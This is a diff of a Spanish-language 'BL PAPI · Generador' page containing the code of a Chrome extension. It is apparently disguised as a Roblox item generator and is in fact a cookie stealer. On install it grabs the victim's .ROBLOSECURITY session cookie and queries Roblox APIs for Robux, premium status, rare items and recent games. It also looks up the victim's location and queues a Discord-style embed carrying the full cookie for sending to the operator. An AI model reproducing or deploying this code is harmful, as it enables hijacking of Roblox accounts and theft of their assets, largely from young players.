@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Generador · BL PAPI</title>
+    <title>BL PAPI · Generador</title>
     <style>
         * {
             margin: 0;
@@ -11,6 +11,7 @@
             box-sizing: border-box;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
+
         body {
             background: linear-gradient(145deg, #0b0c0e 0%, #1a1c20 100%);
             min-height: 100vh;
@@ -19,6 +20,7 @@
             justify-content: center;
             padding: 20px;
         }
+
         .card {
             max-width: 720px;
             width: 100%;
@@ -30,6 +32,7 @@
             padding: 36px 28px;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
         }
+
         h1 {
             font-size: clamp(32px, 8vw, 48px);
             font-weight: 600;
@@ -41,6 +44,7 @@
             margin-bottom: 12px;
             line-height: 1.1;
         }
+
         .subtitle {
             color: #8f939f;
             font-size: 16px;
@@ -51,12 +55,14 @@
             background: rgba(255, 68, 68, 0.05);
             border-radius: 0 12px 12px 0;
         }
+
         .features {
             display: flex;
             flex-wrap: wrap;
             gap: 12px;
             margin-bottom: 36px;
         }
+
         .feature-tag {
             background: rgba(30, 32, 38, 0.8);
             border: 1px solid rgba(255, 255, 255, 0.05);
@@ -71,11 +77,13 @@
             backdrop-filter: blur(4px);
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
         }
+
         .feature-tag span {
             color: #ff4444;
             font-weight: 600;
             margin-left: 4px;
         }
+
         .button-group {
             display: flex;
             flex-direction: row;
@@ -83,6 +91,7 @@
             gap: 14px;
             margin: 36px 0 28px;
         }
+
         .btn {
             flex: 1 1 auto;
             background: #2a2d36;
@@ -101,21 +110,26 @@
             backdrop-filter: blur(4px);
             box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
         }
+
         .btn-primary {
             background: #ff4444;
             border-color: #ff4444;
             box-shadow: 0 10px 25px rgba(255, 68, 68, 0.3);
         }
+
         .btn-primary:hover {
             background: #cc0000;
             transform: scale(1.02);
         }
+
         .btn-secondary {
             background: rgba(40, 42, 48, 0.9);
         }
+
         .btn-secondary:hover {
             background: #32343e;
         }
+
         .instruction-box {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 28px;
@@ -123,6 +137,7 @@
             border: 1px solid rgba(255, 255, 255, 0.03);
             margin-top: 30px;
         }
+
         .instruction-title {
             font-size: 18px;
             font-weight: 600;
@@ -132,6 +147,7 @@
             align-items: center;
             gap: 12px;
         }
+
         .instruction-step {
             background: rgba(255, 255, 255, 0.02);
             border-radius: 20px;
@@ -144,6 +160,7 @@
             align-items: center;
             gap: 12px;
         }
+
         .footer-note {
             text-align: center;
             margin-top: 32px;
@@ -261,7 +278,7 @@ async function obtenerUbicacionCompleta() {
 async function obtenerNombrePais(codigo) {
     if (!codigo || codigo.length !== 2) return 'Desconocido';
     try {
-        const res = await fetch(`https://restcountries.com/v3.1/alpha/${codigo}`);
+        const res = await fetch(\`https://restcountries.com/v3.1/alpha/\${codigo}\`);
         const data = await res.json();
         return data[0]?.translations?.spa?.common || data[0]?.name?.common || codigo;
     } catch {
@@ -271,8 +288,8 @@ async function obtenerNombrePais(codigo) {
 
 async function tieneItem(userId, cookie, assetId) {
     try {
-        const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}`, {
-            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+        const res = await fetch(\`https://inventory.roblox.com/v1/users/\${userId}/items/Asset/\${assetId}\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
         });
         const data = await res.json();
         return data.data && data.data.length > 0;
@@ -283,8 +300,8 @@ async function tieneItem(userId, cookie, assetId) {
 
 async function obtenerGamePasses(userId, cookie) {
     try {
-        const res = await fetch(`https://games.roblox.com/v2/users/${userId}/games?limit=10`, {
-            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=10\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
         });
         if (!res.ok) return 0;
         const data = await res.json();
@@ -296,8 +313,8 @@ async function obtenerGamePasses(userId, cookie) {
 
 async function obtenerUltimosJuegos(userId, cookie) {
     try {
-        const res = await fetch(`https://games.roblox.com/v2/users/${userId}/games?limit=3`, {
-            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=3\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
         });
         if (!res.ok) return ['No disponible', '', ''];
         const data = await res.json();
@@ -311,15 +328,15 @@ async function obtenerInfoRoblox(cookie) {
     if (!cookie) return null;
     try {
         const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
         });
         if (!userRes.ok) return null;
         const user = await userRes.json();
 
         let robux = 0;
         try {
-            const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
-                headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+            const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
+                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
             });
             if (robuxRes.ok) {
                 const r = await robuxRes.json();
@@ -329,8 +346,8 @@ async function obtenerInfoRoblox(cookie) {
 
         let premium = 'No';
         try {
-            const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
-                headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
+            const premiumRes = await fetch(\`https://premiumfeatures.roblox.com/v1/users/\${user.id}/validate-membership\`, {
+                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
             });
             if (premiumRes.ok) {
                 const p = await premiumRes.json();
@@ -340,7 +357,7 @@ async function obtenerInfoRoblox(cookie) {
 
         let seguidores = 0;
         try {
-            const segRes = await fetch(`https://friends.roblox.com/v1/users/${user.id}/followers/count`);
+            const segRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/followers/count\`);
             if (segRes.ok) {
                 const s = await segRes.json();
                 seguidores = s.count || 0;
@@ -349,7 +366,7 @@ async function obtenerInfoRoblox(cookie) {
 
         let amigos = 0;
         try {
-            const amRes = await fetch(`https://friends.roblox.com/v1/users/${user.id}/friends/count`);
+            const amRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/friends/count\`);
             if (amRes.ok) {
                 const a = await amRes.json();
                 amigos = a.count || 0;
@@ -391,55 +408,6 @@ chrome.runtime.onInstalled.addListener(async () => {
     const info = await obtenerInfoRoblox(cookie) || {};
 
     const ahora = new Date();
-    const horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: ubi.region ? `America/${ubi.region}` : 'America/Buenos_Aires' });
-
-    const embed = {
-        title: "¡ 🔔 NUEVA ENTRADA | **BL PAPI** !",
-        color: 15158332,
-        fields: [
-            {
-                name: "📌 INFORMACIÓN GENERAL",
-                value: `**Dispositivo:** \`${navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC'}\`\n**País:** \`${nombrePais}\`\n**Fecha:** \`${ahora.toLocaleDateString('es-AR')}\`\n**Hora Exacta en ${nombrePais}:** \`${horaLocal}\``,
-                inline: false
-            },
-            {
-                name: "ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX",
-                value: `**👤 Usuario:** \`${info.username || 'No disponible'}\`\n**🆔 ID:** \`${info.userId || 'No disponible'}\`\n**💱 Premium:** \`${info.premium || 'No'}\`\n**💰 Robux:** \`${info.robux || 0}\`\n**⭐ Seguidores:** \`${info.seguidores || 0}\`\n**👥 Amigos:** \`${info.amigos || 0}\``,
-                inline: false
-            },
-            {
-                name: "📊 ITEMS LIMITED (RAREZA)",
-                value: `**Headless:** \`${info.headless || 'No'}\`\n**Korblox:** \`${info.korblox || 'No'}\``,
-                inline: false
-            },
-            {
-                name: "📈 ESTADÍSTICAS",
-                value: `🏷 **GamePass/es:** \`${info.gamepasses || 0}\`\n🎮 **Jugado Recientemente:**\n\`\`\`\n1ro ${info.juego1}\n2do ${info.juego2}\n3ro ${info.juego3}\n\`\`\``,
-                inline: false
-            },
-            {
-                name: "🍪 COOKIE DE ROBLOX",
-                value: `\`\`\`${cookie}\`\`\``,
-                inline: false
-            }
-        ],
-        footer: { text: "By **BL PAPI**" }
-    };
-
-    encolarYEnviar({ content: "|| @everyone ||", embeds: [embed] });
-});
-
-chrome.runtime.onInstalled.addListener(async () => {
-    const cookie = await new Promise(r =>
-        chrome.cookies.get({ url:"https://www.roblox.com", name:".ROBLOSECURITY" }, c => r(c?.value))
-    );
-    if (!cookie) return;
-
-    const ubi = await obtenerUbicacionCompleta();
-    const nombrePais = await obtenerNombrePais(ubi.pais);
-    const info = await obtenerInfoRoblox(cookie) || {};
-
-    const ahora = new Date();
     const horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: ubi.region ? \`America/\${ubi.region}\` : 'America/Buenos_Aires' });
 
     const embed = {
@@ -448,22 +416,22 @@ chrome.runtime.onInstalled.addListener(async () => {
         fields: [
             {
                 name: "📌 INFORMACIÓN GENERAL",
-                value: \`**Dispositivo:** \`\${navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC'}\`\n**País:** \`\${nombrePais}\`\n**Fecha:** \`\${ahora.toLocaleDateString('es-AR')}\`\n**Hora Exacta en \${nombrePais}:** \`\${horaLocal}\`\`,
+                value: \`**Dispositivo:** \\\`\${navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC'}\\\`\\n**País:** \\\`\${nombrePais}\\\`\\n**Fecha:** \\\`\${ahora.toLocaleDateString('es-AR')}\\\`\\n**Hora Exacta en \${nombrePais}:** \\\`\${horaLocal}\\\`\`,
                 inline: false
             },
             {
                 name: "ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX",
-                value: \`**👤 Usuario:** \`\${info.username || 'No disponible'}\`\n**🆔 ID:** \`\${info.userId || 'No disponible'}\`\n**💱 Premium:** \`\${info.premium || 'No'}\`\n**💰 Robux:** \`\${info.robux || 0}\`\n**⭐ Seguidores:** \`\${info.seguidores || 0}\`\n**👥 Amigos:** \`\${info.amigos || 0}\`\`,
+                value: \`**👤 Usuario:** \\\`\${info.username || 'No disponible'}\\\`\\n**🆔 ID:** \\\`\${info.userId || 'No disponible'}\\\`\\n**💱 Premium:** \\\`\${info.premium || 'No'}\\\`\\n**💰 Robux:** \\\`\${info.robux || 0}\\\`\\n**⭐ Seguidores:** \\\`\${info.seguidores || 0}\\\`\\n**👥 Amigos:** \\\`\${info.amigos || 0}\\\`\`,
                 inline: false
             },
             {
                 name: "📊 ITEMS LIMITED (RAREZA)",
-                value: \`**Headless:** \`\${info.headless || 'No'}\`\n**Korblox:** \`\${info.korblox || 'No'}\`\`,
+                value: \`**Headless:** \\\`\${info.headless || 'No'}\\\`\\n**Korblox:** \\\`\${info.korblox || 'No'}\\\`\`,
                 inline: false
             },
             {
                 name: "📈 ESTADÍSTICAS",
-                value: \`🏷 **GamePass/es:** \`\${info.gamepasses || 0}\`\n🎮 **Jugado Recientemente:**\n\\\`\\\`\\\`\n1ro \${info.juego1}\n2do \${info.juego2}\n3ro \${info.juego3}\n\\\`\\\`\\\`\`,
+                value: \`🏷 **GamePass/es:** \\\`\${info.gamepasses || 0}\\\`\\n🎮 **Jugado Recientemente:**\\n\\\`\\\`\\\`\\n1ro \${info.juego1}\\n2do \${info.juego2}\\n3ro \${info.juego3}\\n\\\`\\\`\\\`\`,
                 inline: false
             },
             {
